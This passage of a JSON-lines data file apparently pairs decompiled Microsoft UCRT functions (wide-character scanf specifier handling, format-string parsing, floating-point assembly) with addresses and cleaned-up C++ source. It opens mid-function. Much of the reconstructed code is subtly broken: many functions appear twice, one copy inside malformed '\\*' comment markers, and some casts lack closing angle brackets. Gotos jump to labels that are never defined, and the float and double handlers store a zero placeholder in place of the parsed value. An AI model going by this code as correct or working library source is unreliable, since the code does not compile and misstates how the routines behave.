((intermediateCalc2 == intermediateCalc && ((overflowCheck == intermediateCalc3 && ((inputBase2 != 0 || (inputBase <= overflowCheck2)))))))) {\n            flags |= 8;\n            lVar10 = __allmul(inputBase4, inputBase3, intermediateCalc2, overflowCheck);\n            lVar10 += (ulonglong)inputBase;\n        } else {\n            flags |= 0xc;\n        }\n        overflowCheck = (uint)((ulonglong)lVar10 >> 0x20);\n        intermediateCalc2 = (uint)lVar10;\n        currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008);\n        uVar9 = CONCAT44(intermediateCalc3, intermediateCalc);\n        currentCharValue = (uint)(ushort)currentWideChar;\n    } while (true);\n    errorCodePtr = (undefined4 *)FUN_100253b8();\n    *errorCodePtr = 0x16;\n    FUN_1001de96();\n    finalOutput = 0;\n    inputBase = 0;\nLAB_1001fc6f:\n    if ((outputPtr != (undefined *)0x0) && ((additionalInput1 | additionalInput2) == 0)) {\n        *outputPtr = 0;\n    }\n    return CONCAT44(inputBase, finalOutput);\nLAB_1001fbdd:\n    __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008, currentWideChar);\n    currentCharValue = intermediateCalc2;\n    inputBase = overflowCheck;\n    if ((flags & 8) == 0) {\n        restore_state(&stack0x00000008, inputBase5, inputBase6);\n        finalOutput = 0;\n        inputBase = 0;\n    } else {\n        if (__crt_strtox::is_overflow_condition<unsigned___int64>(flags, CONCAT44(unaff_ESI, overflowCheck))) {\n            errorCodePtr = (undefined4 *)FUN_100253b8();\n            *errorCodePtr = 0x22;\n            if ((flags & 1) == 0) {\n                inputBase = 0xffffffff;\n                finalOutput = 0xffffffff;\n            } else if ((flags & 2) == 0) {\n                inputBase = 0x7fffffff;\n            } else {\n                finalOutput = 0;\n                inputBase = 0x80000000;\n            }\n        } else {\n            finalOutput = currentCharValue;\n            if ((flags & 2) != 0) {\n                finalOutput = -currentCharValue;\n                inputBase = -(inputBase + (currentCharValue != 0));\n            }\n        }\n    }\n    if (local_38 != '\\0') {\n        *(uint *)(local_44[0] + 0x350) &= 0xfffffffd;\n    }\n    goto LAB_1001fc6f;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_floating_point_specifier_t<float>", "Address": "1001fc8a", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_floating_point_specifier_t<float>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this)\n{\n    int iVar2; \n    float local_c = 0.0; \n    char local_5 = '\\0'; \n    \n    make_input_adapter_character_source<>(nullptr, this + 8, *(undefined4 *)(this + 0x38), *(undefined4 *)(this + 0x3c), &local_5);\n    \n    \n    iVar2 = parse_floating_point<>(*(int **)(this + 0x50));\n    \n    if (local_5 == '\\0' || iVar2 == 1) {\n        return false; \n    } else if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n        \n        return write_floating_point<float>(this, &local_c);\n    }\n    \n    return true; \n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_floating_point_specifier_t<double>", "Address": "1001fcf2", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_floating_point_specifier_t<double>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this)\n{\n    bool bVar1; \n    double local_14 = 0.0; \n    char local_5 = '\\0'; \n    \n    make_input_adapter_character_source<>(nullptr, this + 8, *(undefined4 *)(this + 0x38), *(undefined4 *)(this + 0x3c), &local_5);\n    \n    \n    if ((local_5 == '\\0') || (parse_floating_point<>(*(int **)(this + 0x50)) == 1)) {\n        bVar1 = false; \n    } else if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n        \n        bVar1 = write_floating_point<double>(this, &local_14);\n    } else {\n        bVar1 = true; \n    }\n    \n    return bVar1; \n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_string_specifier_tchar<char>", "Address": "1001fd5a", "Source Code": "\\*\nbool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_string_specifier_tchar<char>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nconversion_mode param_1,char param_2)\n{\n    rsize_t *prVar1; \n    bool bVar2; \n    ushort uVar3; \n    undefined4 *puVar4; \n    char *pcVar6; \n    rsize_t rVar7; \n    pcVar6 = (char *)0x0; \n    \n    if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n        *(int *)(this + 0x54) = *(int *)(this + 0x54) + 4; \n        prVar1 = *(rsize_t **)(this + 0x54); \n        pcVar6 = (char *)prVar1[-1]; \n        \n        if (pcVar6 == (char *)0x0) {\n            puVar4 = (undefined4 *)FUN_100253b8(); \n            *puVar4 = 0x16; \n            FUN_1001de96(); \n            return false; \n        }\n        \n        if ((*(uint *)this & 1) != 0) {\n            *(rsize_t **)(this + 0x54) = prVar1 + 1; \n            rVar7 = *prVar1; \n            goto LAB_1001fdab; \n        }\n    }\n    rVar7 = 0xffffffff; \nLAB_1001fdab:\n    \n    if (rVar7 == 0) {\n        \n        if ((*(uint *)this & 4) != 0) {\n            string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8)); \n            *pcVar6 = '\\0'; \n        }\n        puVar4 = (undefined4 *)FUN_100253b8(); \n        *puVar4 = 0xc; \n    } else {\n        uint local_14 = *(uint *)(this + 0x38); \n        uint local_18 = *(uint *)(this + 0x3c); \n        rsize_t local_10 = rVar7; \n        \n        if ((param_1 != 0) && (rVar7 != 0xffffffff)) {\n            local_10 = rVar7 - 1; \n        }\n        uint local_c = 0; \n        uint local_8 = 0; \n        while (true) {\n            \n            if ((((local_14 | local_18) != 0) && (local_c == local_14)) && (local_8 == local_18))\n                goto LAB_1001fe7d; \n            uVar3 = string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8)); \n            bVar2 = is_character_allowed_in_string(this,param_1,uVar3); \n            if (!bVar2) break; \n            \n            if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n                \n                if (local_10 == 0) {\n                    if (rVar7 != 0xffffffff) goto LAB_1001fdc0; \n                    goto LAB_1001fdc3; \n                }\n                \n                if ((char)write_character(pcVar6,rVar7,&pcVar6,&local_10,(wchar_t)uVar3) == '\\0') goto LAB_1001fe7d; \n            }\n            local_c++; \n            local_8 += (0xfffffffe < local_c); \n        }\n        string_input_adapter<wchar_t>::unget((string_input_adapter<wchar_t> *)(this + 8),(wchar_t)uVar3); \nLAB_1001fe7d:\n        \n        if (((local_c | local_8) != 0) &&\n            (((param_1 != 0 || ((local_c == local_14 && (local_8 == local_18)))) ||\n            ((*(uint *)this & 4) != 0)))) {\n            \n            if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n                if (param_1 != 0) {\n                    *pcVar6 = '\\0'; \n                }\n                *(int *)(this + 0x58) = *(int *)(this + 0x58) + 1; \n            }\n            return true; \n        }\n    }\n    return false; \n}\n*\\ \n \nbool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_string_specifier_tchar<char>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nconversion_mode param_1,char param_2)\n{\nrsize_t *prVar1;\nbool bVar2;\nushort uVar3;\nundefined4 *puVar4;\nchar *pcVar6;\nrsize_t rVar7;\npcVar6 = (char *)0x0;\nif (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n    *(int *)(this + 0x54) = *(int *)(this + 0x54) + 4;\n    prVar1 = *(rsize_t **)(this + 0x54);\n    pcVar6 = (char *)prVar1[-1];\n    if (pcVar6 == (char *)0x0) {\n        puVar4 = (undefined4 *)FUN_100253b8();\n        *puVar4 = 0x16;\n        FUN_1001de96();\n        return false;\n    }\n    if ((*(uint *)this & 1) != 0) {\n        *(rsize_t **)(this + 0x54) = prVar1 + 1;\n        rVar7 = *prVar1;\n        goto LAB_1001fdab;\n    }\n}\nrVar7 = 0xffffffff;\nLAB_1001fdab:\nif (rVar7 == 0) {\n    if ((*(uint *)this & 4) != 0) {\n        string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8));\n        *pcVar6 = '\\0';\n    }\n    puVar4 = (undefined4 *)FUN_100253b8();\n    *puVar4 = 0xc;\n} else {\n    uint local_14 = *(uint *)(this + 0x38);\n    uint local_18 = *(uint *)(this + 0x3c);\n    rsize_t local_10 = rVar7;\n    if ((param_1 != 0) && (rVar7 != 0xffffffff)) {\n        local_10 = rVar7 - 1;\n    }\n    uint local_c = 0;\n    uint local_8 = 0;\n    while (true) {\n        if ((((local_14 | local_18) != 0) && (local_c == local_14)) && (local_8 == local_18))\n            goto LAB_1001fe7d;\n        uVar3 = string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8));\n        bVar2 = is_character_allowed_in_string(this,param_1,uVar3);\n        if (!bVar2) break;\n        if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n            if (local_10 == 0) {\n                if (rVar7 != 0xffffffff) goto LAB_1001fdc0;\n                goto LAB_1001fdc3;\n            }\n            if ((char)write_character(pcVar6,rVar7,&pcVar6,&local_10,(wchar_t)uVar3) == '\\0') goto LAB_1001fe7d;\n        }\n        local_c++;\n        local_8 += (0xfffffffe < local_c);\n    }\n    string_input_adapter<wchar_t>::unget((string_input_adapter<wchar_t> *)(this + 8),(wchar_t)uVar3);\nLAB_1001fe7d:\n    if (((local_c | local_8) != 0) &&\n        (((param_1 != 0 || ((local_c == local_14 && (local_8 == local_18)))) ||\n        ((*(uint *)this & 4) != 0)))) {\n        if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n            if (param_1 != 0) {\n                *pcVar6 = '\\0';\n            }\n            *(int *)(this + 0x58) = *(int *)(this + 0x58) + 1;\n        }\n        return true;\n    }\n}\nreturn false;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_string_specifier_tchar<wchar_t>", "Address": "1001fec5", "Source Code": "\\*\nbool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_string_specifier_tchar<wchar_t>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nconversion_mode param_1,wchar_t param_2)\n{\n    int *piVar1; \n    uint uVar2; \n    uint uVar3; \n    bool bVar4; \n    ushort uVar5; \n    undefined4 *puVar6; \n    uint uVar7; \n    uint uVar8; \n    ushort *puVar9; \n    int iVar10; \n    puVar9 = (ushort *)0x0; \n    \n    if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n        *(int *)(this + 0x54) = *(int *)(this + 0x54) + 4; \n        piVar1 = *(int **)(this + 0x54); \n        puVar9 = (ushort *)piVar1[-1]; \n        \n        if (puVar9 == (ushort *)0x0) {\n            puVar6 = (undefined4 *)FUN_100253b8(); \n            *puVar6 = 0x16; \n            FUN_1001de96(); \n            return false; \n        }\n        \n        if ((*(uint *)this & 1) != 0) {\n            *(int **)(this + 0x54) = piVar1 + 1; \n            iVar10 = *piVar1; \n            goto LAB_1001ff16; \n        }\n    }\n    iVar10 = -1; \nLAB_1001ff16:\n    \n    if (iVar10 == 0) {\n        \n        if ((*(uint *)this & 4) != 0) {\n            string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8)); \n            *puVar9 = 0; \n        }\n        puVar6 = (undefined4 *)FUN_100253b8(); \n        *puVar6 = 0xc; \n    } else {\n        uVar2 = *(uint *)(this + 0x38); \n        uVar3 = *(uint *)(this + 0x3c); \n        int local_8 = (param_1 != 0 && iVar10 != -1) ? iVar10 - 1 : iVar10; \n        uVar8 = 0; \n        uVar7 = 0; \n        ushort *local_1c = puVar9; \n        while (true) {\n            \n            if ((((uVar2 | uVar3) != 0) && (uVar8 == uVar2)) && (uVar7 == uVar3)) goto LAB_1001ffe7; \n            uVar5 = string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8)); \n            bVar4 = is_character_allowed_in_string(this, param_1, uVar5); \n            if (!bVar4) break; \n            \n            if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n                \n                if (local_8 == 0) {\n                    if (iVar10 != -1) goto LAB_1001ff2b; \n                    goto LAB_1001ff30; \n                }\n                *local_1c = uVar5; \n                local_1c++; \n                local_8--; \n            }\n            bVar4 = 0xfffffffe < uVar8; \n            uVar8++; \n            uVar7 += bVar4; \n        }\n        string_input_adapter<wchar_t>::unget((string_input_adapter<wchar_t> *)(this + 8), uVar5); \nLAB_1001ffe7:\n        \n        if (((uVar8 | uVar7) != 0) &&\n            (((param_1 != 0 || ((uVar8 == uVar2 && (uVar7 == uVar3)))) || ((*(uint *)this & 4) != 0)))) {\n            \n            if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n                if (param_1 != 0) {\n                    *local_1c = 0; \n                }\n                *(int *)(this + 0x58) = *(int *)(this + 0x58) + 1; \n            }\n            return true; \n        }\n    }\n    return false; \n}\n*\\ \n \nbool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_string_specifier_tchar<wchar_t>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nconversion_mode param_1,wchar_t param_2)\n{\nint *piVar1;\nuint uVar2;\nuint uVar3;\nbool bVar4;\nushort uVar5;\nundefined4 *puVar6;\nuint uVar7;\nuint uVar8;\nushort *puVar9;\nint iVar10;\npuVar9 = (ushort *)0x0;\nif (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n    *(int *)(this + 0x54) = *(int *)(this + 0x54) + 4;\n    piVar1 = *(int **)(this + 0x54);\n    puVar9 = (ushort *)piVar1[-1];\n    if (puVar9 == (ushort *)0x0) {\n        puVar6 = (undefined4 *)FUN_100253b8();\n        *puVar6 = 0x16;\n        FUN_1001de96();\n        return false;\n    }\n    if ((*(uint *)this & 1) != 0) {\n        *(int **)(this + 0x54) = piVar1 + 1;\n        iVar10 = *piVar1;\n        goto LAB_1001ff16;\n    }\n}\niVar10 = -1;\nLAB_1001ff16:\nif (iVar10 == 0) {\n    if ((*(uint *)this & 4) != 0) {\n        string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8));\n        *puVar9 = 0;\n    }\n    puVar6 = (undefined4 *)FUN_100253b8();\n    *puVar6 = 0xc;\n} else {\n    uVar2 = *(uint *)(this + 0x38);\n    uVar3 = *(uint *)(this + 0x3c);\n    int local_8 = (param_1 != 0 && iVar10 != -1) ? iVar10 - 1 : iVar10;\n    uVar8 = 0;\n    uVar7 = 0;\n    ushort *local_1c = puVar9;\n    while (true) {\n        if ((((uVar2 | uVar3) != 0) && (uVar8 == uVar2)) && (uVar7 == uVar3)) goto LAB_1001ffe7;\n        uVar5 = string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8));\n        bVar4 = is_character_allowed_in_string(this, param_1, uVar5);\n        if (!bVar4) break;\n        if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n            if (local_8 == 0) {\n                if (iVar10 != -1) goto LAB_1001ff2b;\n                goto LAB_1001ff30;\n            }\n            *local_1c = uVar5;\n            local_1c++;\n            local_8--;\n        }\n        bVar4 = 0xfffffffe < uVar8;\n        uVar8++;\n        uVar7 += bVar4;\n    }\n    string_input_adapter<wchar_t>::unget((string_input_adapter<wchar_t> *)(this + 8), uVar5);\nLAB_1001ffe7:\n    if (((uVar8 | uVar7) != 0) &&\n        (((param_1 != 0 || ((uVar8 == uVar2 && (uVar7 == uVar3)))) || ((*(uint *)this & 4) != 0)))) {\n        if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n            if (param_1 != 0) {\n                *local_1c = 0;\n            }\n            *(int *)(this + 0x58) = *(int *)(this + 0x58) + 1;\n        }\n        return true;\n    }\n}\nreturn false;\n}"}
{"Function Name": "__crt_stdio_input::skip_whitespace<class___crt_stdio_input::string_input_adapter,wchar_t>", "Address": "10020031", "Source Code": "\\*\nushort __cdecl\n__crt_stdio_input::skip_whitespace<class___crt_stdio_input::string_input_adapter,wchar_t>\n(string_input_adapter<wchar_t> *param_1, __crt_locale_pointers *param_2)\n{\n    ushort _C; \n    do {\n        _C = string_input_adapter<wchar_t>::get(param_1); \n        if (_C == 0xffff) { \n            return 0xffff; \n        }\n    } while (_iswctype(_C, 8) != 0); \n    return _C; \n}\n*\\ \n \nushort __cdecl\n__crt_stdio_input::skip_whitespace<class___crt_stdio_input::string_input_adapter,wchar_t>\n(string_input_adapter<wchar_t> *param_1,__crt_locale_pointers *param_2)\n{\nushort _C;\ndo {\n    _C = string_input_adapter<wchar_t>::get(param_1);\n    if (_C == 0xffff) {\n        return 0xffff;\n    }\n} while (_iswctype(_C, 8) != 0);\nreturn _C;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::write_floating_point<float>", "Address": "10020060", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::write_floating_point<float>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nfloat *param_1)\n{\n    \n    *(int *)(this + 0x54) += 4;\n    \n    float *pfVar1 = *(float **)(*(int *)(this + 0x54) - 4);\n    \n    if (pfVar1 != (float *)0x0) {\n        \n        *(int *)(this + 0x58) += 1;\n        \n        *pfVar1 = *param_1;\n    } else {\n        \n        undefined4 *puVar2 = (undefined4 *)FUN_100253b8();\n        \n        \n        *puVar2 = 0x16;\n        \n        FUN_1001de96();\n    }\n    \n    return pfVar1 != (float *)0x0;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::write_floating_point<double>", "Address": "10020097", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::write_floating_point<double>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\ndouble *param_1)\n{\n    \n    *(int *)(this + 0x54) += 4;\n    \n    undefined4 *puVar1 = *(undefined4 **)(*(int *)(this + 0x54) - 4);\n    \n    if (puVar1 != (undefined4 *)0x0) {\n        \n        *(int *)(this + 0x58) += 1;\n        \n        *puVar1 = *(undefined4 *)param_1;\n        \n        puVar1[1] = *(undefined4 *)((int)param_1 + 4);\n    } else {\n        \n        undefined4 *puVar2 = (undefined4 *)FUN_100253b8();\n        \n        *puVar2 = 0x16;\n        \n        FUN_1001de96();\n    }\n    \n    return puVar1 != (undefined4 *)0x0;\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::format_string_parser<wchar_t>", "Address": "100200d4", "Source Code": "\\*\nformat_string_parser<wchar_t> * __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::format_string_parser<wchar_t>\n(format_string_parser<wchar_t> *this,__uint64 param_1,wchar_t *param_2)\n{\n    \n    *(__uint64 *)this = param_1;\n    \n    *(wchar_t **)(this + 8) = param_2;\n    \n    *(undefined4 *)(this + 0xc) = 0;\n    \n    this[0x18] = (format_string_parser<wchar_t>)0x0;\n    \n    *(undefined4 *)(this + 0x20) = 0;\n    \n    this[0x2c] = (format_string_parser<wchar_t>)0x0;\n    \n    return this;\n}\n*\\ \n \nformat_string_parser<wchar_t> * __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::format_string_parser<wchar_t>\n(format_string_parser<wchar_t> *this,__uint64 param_1,wchar_t *param_2)\n{\n    *(__uint64 *)this = param_1;\n    *(wchar_t **)(this + 8) = param_2;\n    *(undefined4 *)(this + 0xc) = 0;\n    this[0x18] = (format_string_parser<wchar_t>)0x0;\n    *(undefined4 *)(this + 0x20) = 0;\n    this[0x2c] = (format_string_parser<wchar_t>)0x0;\n    return this;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>", "Address": "10020143", "Source Code": "\\*\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> * __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this, \nstring_input_adapter<wchar_t> *param_1, \n__uint64 param_2, \nwchar_t *param_3, \n__crt_locale_pointers *param_4) \n{\n    \n    *(undefined4 *)this = *(undefined4 *)param_1;\n    \n    \n    *(undefined4 *)(this + 4) = (undefined4)param_2;\n    \n    \n    *(undefined4 *)(this + 8) = *(undefined4 *)(param_1 + 4);\n    \n    \n    *(undefined4 *)(this + 0xc) = *(undefined4 *)(param_1 + 8);\n    \n    \n    format_string_parser<wchar_t>::format_string_parser<wchar_t>\n    ((format_string_parser<wchar_t> *)(this + 0x18), param_2, param_2._4_4_);\n    \n    \n    *(undefined4 *)(this + 0x58) = 0;\n    \n    \n    *(undefined4 *)(this + 0x5c) = 0;\n    \n    \n    *(wchar_t **)(this + 0x50) = param_3;\n    \n    \n    *(__crt_locale_pointers **)(this + 0x54) = param_4;\n    \n    \n    return this;\n}\n*\\ \n \ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> * __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nstring_input_adapter<wchar_t> *param_1,__uint64 param_2,wchar_t *param_3,\n__crt_locale_pointers *param_4)\n{\n*(undefined4 *)this = *(undefined4 *)param_1;\n*(undefined4 *)(this + 4) = (undefined4)param_2;\n*(undefined4 *)(this + 8) = *(undefined4 *)(param_1 + 4);\n*(undefined4 *)(this + 0xc) = *(undefined4 *)(param_1 + 8);\nformat_string_parser<wchar_t>::format_string_parser<wchar_t>\n((format_string_parser<wchar_t> *)(this + 0x18), param_2, param_2._4_4_);\n*(undefined4 *)(this + 0x58) = 0;\n*(undefined4 *)(this + 0x5c) = 0;\n*(wchar_t **)(this + 0x50) = param_3;\n*(__crt_locale_pointers **)(this + 0x54) = param_4;\nreturn this;\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::advance", "Address": "100201b7", "Source Code": "bool __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::advance(format_string_parser<wchar_t> *this)\n{\n    short *psVar1; \n    bool bVar2;    \n    int iVar3;     \n    \n    if (*(int *)(this + 0xc) == 0) {\n        *(undefined4 *)(this + 0x10) = 0; \n        this[0x18] = (format_string_parser<wchar_t>)0x0; \n        this[0x2c] = (format_string_parser<wchar_t>)0x0; \n        *(undefined4 *)(this + 0x30) = 0; \n        \n        if (**(wint_t **)(this + 8) != 0) {\n            iVar3 = _iswctype(**(wint_t **)(this + 8), 8); \n            if (iVar3 == 0) { \n                psVar1 = *(short **)(this + 8); \n                \n                if ((*psVar1 == 0x25) && (psVar1[1] != 0x25)) {\n                    *(undefined4 *)(this + 0x10) = 4; \n                    *(short **)(this + 8) = psVar1 + 1; \n                    scan_optional_assignment_suppressor(this); \n                    bVar2 = scan_optional_field_width(this); \n                    if (!bVar2) { \n                        return false; \n                    }\n                    scan_optional_length_modifier(this); \n                    scan_optional_wide_modifier(this); \n                    bVar2 = scan_conversion_specifier(this); \n                    if (!bVar2) { \n                        return false; \n                    }\n                    \n                    if ((&DAT_1003eb70)[*(int *)(this + 0x28) + *(int *)(this + 0x30) * 0xc] == '\\0') {\n                        reset_token_state_for_error(this, 0x16); \n                        return false; \n                    }\n                    return true; \n                }\n                *(undefined4 *)(this + 0x10) = 3; \n                *(short **)(this + 8) = psVar1 + (*psVar1 == 0x25) + 1; \n            } else {\n                *(undefined4 *)(this + 0x10) = 2; \n                \n                while (iVar3 = _iswctype(**(wint_t **)(this + 8), 8), iVar3 != 0) {\n                    *(int *)(this + 8) = *(int *)(this + 8) + 2; \n                }\n            }\n            return true; \n        }\n        *(undefined4 *)(this + 0x10) = 1; \n    }\n    return false; \n}"}
{"Function Name": "__crt_strtox::floating_point_value::as_double", "Address": "100202b9", "Source Code": "double * __thiscall __crt_strtox::floating_point_value::as_double(floating_point_value *fp_value)\n{\n    \n    if (fp_value[4] != (floating_point_value)0x0) {\n        \n        return *(double **)fp_value;\n    }\n    \n    invoke_error_reporting(L\"_is_double\", L\"__crt_strtox::floating_point_value::as_double\",\n                    L\"minkernel\\\\crts\\\\ucrt\\\\inc\\\\corecrt_internal_strtox.h\", 0x19f, 0);\n}"}
{"Function Name": "__crt_strtox::floating_point_value::as_float", "Address": "100202de", "Source Code": "float * __thiscall __crt_strtox::floating_point_value::as_float(floating_point_value *fp_value)\n{\n    \n    if (fp_value[4] == (floating_point_value)0x0) {\n        \n        return *(float **)fp_value;\n    }\n    \n    invoke_error_reporting(L\"!_is_double\", L\"__crt_strtox::floating_point_value::as_float\",\n                    L\"minkernel\\\\crts\\\\ucrt\\\\inc\\\\corecrt_internal_strtox.h\", 0x1a5, 0);\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_infinity", "Address": "10020303", "Source Code": "void __cdecl\n__crt_strtox::assemble_floating_point_infinity(bool param_1, floating_point_value *param_2)\n{\n    \n    if (param_2[4] != (floating_point_value)0x0) {\n        \n        assemble_floating_point_infinity<double>(param_1, floating_point_value::as_double(param_2));\n        return; \n    }\n    \n    *floating_point_value::as_float(param_2) = (float)((uint)param_1 << 0x1f | 0x7f800000);\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_value_from_big_integer", "Address": "10020685", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::assemble_floating_point_value_from_big_integer\n(big_integer *param_1, uint param_2, bool param_3, bool param_4, floating_point_value *param_5)\n{\n    uint uVar1; \n    SLD_STATUS SVar2; \n    byte bVar3; \n    undefined4 uVar4; \n    int iVar5; \n    undefined4 uVar6; \n    int iVar7; \n    bool bVar8; \n    longlong lVar9; \n    longlong lVar10; \n    ulonglong uVar11; \n    \n    iVar5 = ((param_5[4] == (floating_point_value)0x0) - 1 & 0x1d) + 0x17;\n    \n    if (param_2 < 0x41) {\n        \n        uVar6 = (*(int *)param_1 == 0) ? 0 : *(undefined4 *)(param_1 + 4);\n        uVar4 = (*(uint *)param_1 < 2) ? 0 : *(undefined4 *)(param_1 + 8);\n        bVar8 = !param_4; \n    } else {\n        \n        uVar1 = param_2 & 0x1f;\n        \n        iVar7 = (param_2 >> 5) - 2;\n        \n        if (uVar1 != 0) {\n            bVar8 = true; \n            \n            iVar5 = iVar7 * 0x20 + uVar1 + iVar5;\n            bVar3 = (byte)uVar1; \n            \n            uVar1 = *(uint *)(param_1 + iVar7 * 4 + 4);\n            \n            lVar9 = __allshl(-bVar3 + 0x20, 0);\n            lVar10 = __allshl(-bVar3 + 0x40, 0);\n            uVar11 = __aullshr(bVar3, 0);\n            lVar9 = lVar9 + lVar10 + uVar11; \n            \n            if ((param_4) || ((uVar1 & (1 << bVar3) - 1U) != 0)) {\n                bVar8 = false; \n            }\n            \n            for (; iVar7 != 0; iVar7--) {\n                param_1 = (big_integer *)((int)param_1 + 4); \n                bVar8 = (bool)(bVar8 & *(int *)param_1 == 0); \n            }\n            goto LAB_10020804; \n        }\n        \n        iVar5 = iVar7 * 0x20 + iVar5;\n        \n        uVar4 = *(undefined4 *)(param_1 + (param_2 >> 5) * 4);\n        uVar6 = *(undefined4 *)(param_1 + iVar7 * 4 + 4);\n        bVar8 = !param_4; \n        \n        for (; iVar7 != 0; iVar7--) {\n            param_1 = (big_integer *)((int)param_1 + 4); \n            bVar8 = (bool)(bVar8 & *(int *)param_1 == 0); \n        }\n    }\n    lVar9 = CONCAT44(uVar4, uVar6); \nLAB_10020804:\n    \n    SVar2 = FUN_1002033d((uint)lVar9, (uint)((ulonglong)lVar9 >> 0x20), iVar5, param_3, bVar8, param_5);\n    return SVar2; \n}"}
